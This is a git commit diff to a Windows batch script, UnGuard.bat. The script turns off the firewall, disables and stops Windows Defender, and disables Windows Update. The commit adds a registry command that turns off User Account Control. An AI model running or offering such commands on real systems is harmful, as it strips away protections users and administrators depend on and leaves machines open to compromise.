6446f272f63b4c74fb05e8031f18d61e467b15a7
UCC <45124308+ucc-hk@users.noreply.github.com>
2019-09-15 17:18:40 +0800

    Update UnGuard.bat

--- UnGuard.bat
+++ UnGuard.bat
@@ -2,3 +2,4 @@ netsh advfirewall set allprofiles state off
 sc config WinDefend start= disabled
 sc stop WinDefend 
 sc config wuauserv start= disabled
+reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
